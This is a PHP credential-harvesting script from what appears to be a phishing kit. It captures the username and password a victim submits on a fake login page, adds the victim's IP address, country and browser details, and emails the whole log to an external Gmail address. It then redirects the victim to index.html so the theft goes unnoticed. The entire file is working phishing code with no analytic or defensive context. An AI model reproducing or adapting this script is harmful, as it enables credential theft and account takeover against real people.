<?

$password = $_POST['password'];

$ip = getenv("REMOTE_ADDR");
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$adddate=date("D M d, Y g:i a");
$browser  =     $_SERVER['HTTP_USER_AGENT'];
$message  =     "=============+[ User Info ]+==============\n";
$message .=     "Username : ".$_POST['username']."\n";
$message .=     "Password : ".$_POST['password']."\n";
$message .=     "=============+[ Loc Info ]+===============\n";
$message .=     "IP: ".$ip."\n";
$message .=     "=======================================\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .=     "=======================================\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .=     "=======================================\n";
$message .= 	"User-Agent: ".$browser."\n";
$message .=     "=======================================\n";
$message .=     "Date  & Time Log  : ".$adddate."\n";
$message .=     "=======================================\n";

$sniper = 'DON ZIPO.COM';
$who_be_the_boss = 'GeneralLogs';
$subj = "$sniper Login $ip $adddate\n";
$from = "From: $who_be_the_boss <west>\n";
mail("whogopay@gmail.com",$subj,$message,$from,$sniper);

header("Location: index.html");

?>